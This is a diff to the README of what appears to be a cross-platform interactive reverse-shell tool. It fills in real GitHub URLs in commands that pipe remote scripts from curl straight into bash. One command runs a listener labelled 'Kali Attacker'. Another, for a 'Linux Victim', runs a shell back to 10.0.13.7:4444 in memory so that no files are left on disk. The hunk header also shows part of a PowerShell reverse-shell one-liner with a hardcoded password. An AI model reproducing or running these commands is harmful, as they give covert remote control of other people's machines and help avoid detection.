@@ -54,13 +54,13 @@ $IP="10.0.13.7"; $P=4444; $pw="mysecretpass"; $cb={ $true }; try { $c=New-Object
 ### Execution via Remote Pipe (Kali Attacker)
 Download and run the listener in memory. Ensure you provide the port and password as arguments.
 ```bash
-source <(curl -sSL https://githubusercontent.com) 4444 mysecretpass
+source <(curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/bash_tty.sh) 4444 mysecretpass
 ```
 
 ### Execution via Remote Pipe (Linux Victim)
 Execute the shell directly in memory without leaving files on the disk. This keeps `stdin` open for the interactive session.
 ```bash
-bash <(curl -sSL https://githubusercontent.com) 10.0.13.7 4444 mysecretpass
+bash <(curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/victim.sh) 10.0.13.7 4444 mysecretpass
 ```
 
 ### Execution via CMD (Windows Victim)
